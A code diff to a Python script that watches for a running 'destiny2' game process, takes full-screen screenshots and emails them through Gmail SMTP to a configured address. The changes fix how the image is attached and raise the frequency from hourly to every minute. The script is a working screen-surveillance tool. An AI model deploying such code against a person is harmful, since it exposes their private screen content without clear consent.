@@ -5,6 +5,7 @@ import smtplib
 import os
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.mime.image import MIMEImage
 import pyscreenshot as ImageGrab
 import imghdr
 import time
@@ -40,12 +41,15 @@ while True:
 		if checkIfProcessRunning('destiny2'):
 			ts = time.time()
 			im = ImageGrab.grab()
+			im.save("destiny.png")
 			msg = MIMEMultipart()
 			msg['From'] = gmail_user
 			msg['To'] = str(emailToSendTo)
 			msg['Subject'] = "Gods plan : " + str(ts)
-			msg.add_attachment(im, maintype='image',
-							   subtype=imghdr.what(None, im))
+			with open('destiny.png', 'rb') as fp:
+				img = MIMEImage(fp.read())
+				img.add_header('Content-Disposition', 'attachment', filename="destiny.png")
+				msg.attach(img)
 
 			try:
 				server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
@@ -86,4 +90,4 @@ while True:
 			print('No chrome process was running')
 	except Exception as exception:
 		print("Error 1: %s!\n\n" % exception)
-	time.sleep(60 * 60 * 1)
+	time.sleep(60 * 1)
